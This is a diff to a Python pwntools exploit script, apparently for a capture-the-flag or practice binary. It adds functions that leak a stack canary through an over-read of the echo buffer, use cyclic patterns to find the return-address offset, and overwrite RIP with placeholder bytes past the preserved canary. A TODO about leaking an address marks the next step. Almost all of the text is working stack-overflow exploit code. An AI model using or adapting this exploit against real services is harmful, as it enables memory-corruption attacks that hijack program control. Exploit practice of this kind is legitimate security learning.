@@ -71,15 +71,10 @@ def print_canary():
     #print(received_stack)
     print("Send Payload?")
     input()
-    p.sendline(b'X'*8) #this is the canary
-    print(p.recv())
+    p.sendline(b'X'*8) 
     input()
 
-def exp():
-    # b *do_echo+129 to check which loop going into
-    # b *do_echo+151 to check arguments for first read in first loop
-    # b *do_echo+297, then look at RCX to check stack canary 
-    # x/20gx $rbp - 80 to look at activity around the base pointer
+def cycle_rip():
     print("Start Receiving?")
     input()
     print(p.recv())
@@ -88,27 +83,86 @@ def exp():
     payload += struct.pack('Q', 0x200) #Number of bytes to be written to screen
     num_padding = 0x11b - len(payload) - 0x12
     payload += b'C' * (num_padding)
-    print("Send Payload?")
+    print("Send Canary Payload?")
     input()
     p.send(payload)
     received_stack = p.recv()
     canary_offset = num_padding+14 
-    canary = received_stack[canary_offset: canary_offset+7]
+    canary = received_stack[canary_offset: canary_offset+8]
     print("Canary: 0x{:x}".format(struct.unpack('Q',canary)[0]))
-    print("Received Stack:")
-    print(received_stack)
-    print("Send Payload?")
+    #print("Received Stack:")
+    #print(received_stack)
+    print("Send Reset Payload?")
     input()
-    p.sendline(b'X'*8) #this is the canary
+    p.sendline(b'X'*8) 
     print(p.recv())
+    payload = b'\xff' +  b'A' * 8 + b'B' * 0x109 
+    print("Send RIP Payload?")
     input()
+    payload = b'\xff' +  b'A' * 8 + b'B' * 0x109 
+    payload += canary 
+    # b *do_echo+314
+    '''
+    #to check input
+    $ python
+    > from pwn import *
+    > cyclic_find(b'caaadaaa') # 0x6161616461616163 ('caaadaaa')
+    8
+    '''
+    payload += cyclic(1000)
+    p.sendline(payload)
+    print(p.recv())
+    # Need to send this second packet to trigger the stack smashing message
+    print("Send Trigger Payload?")
+    input()
+    p.sendline(b'X'*8)
+    print(p.recv())
 
+def take_control_rip():
+    print("Start Receiving?")
+    input()
+    print(p.recv())
+    payload = b'\xff' #force first loop
+    #payload += b'A' * 8 #Number of bytes to write into buffer first and second time
+    payload += struct.pack('Q', 0x200) #Number of bytes to be written to screen
+    num_padding = 0x11b - len(payload) - 0x12
+    payload += b'C' * (num_padding)
+    print("Send Canary Payload?")
+    input()
+    p.send(payload)
+    received_stack = p.recv()
+    canary_offset = num_padding+14 
+    canary = received_stack[canary_offset: canary_offset+8]
+    print("Canary: 0x{:x}".format(struct.unpack('Q',canary)[0]))
+    #print("Received Stack:")
+    #print(received_stack)
+    print("Send Reset Payload?")
+    input()
+    p.sendline(b'X'*8) 
+    print(p.recv())
+    payload = b'\xff' +  b'A' * 8 + b'B' * 0x109 
+    print("Send RIP Payload?")
+    input()
+    payload = b'\xff' +  b'A' * 8 + b'B' * 0x109 
+    payload += canary 
+    # b *do_echo+314
+    payload += b'D'*8 #RBP 
+    payload += b'X'*8 #RIP 
+    payload += b'E'*16
+    p.sendline(payload)
+    print(p.recv())
+    # Need to send this second packet to trigger the stack smashing message
+    print("Send Trigger Payload?")
+    input()
+    p.sendline(b'C'*8)
+    print(p.recv())
 
 #TODO: Leak address to redirect rip
 
 if __name__=='__main__':
     #stack_smashing()
     #stack_smashing2()
-    print_canary()
-    exp()
+    #print_canary()
+    #cycle_rip()
+    take_control_rip()
 
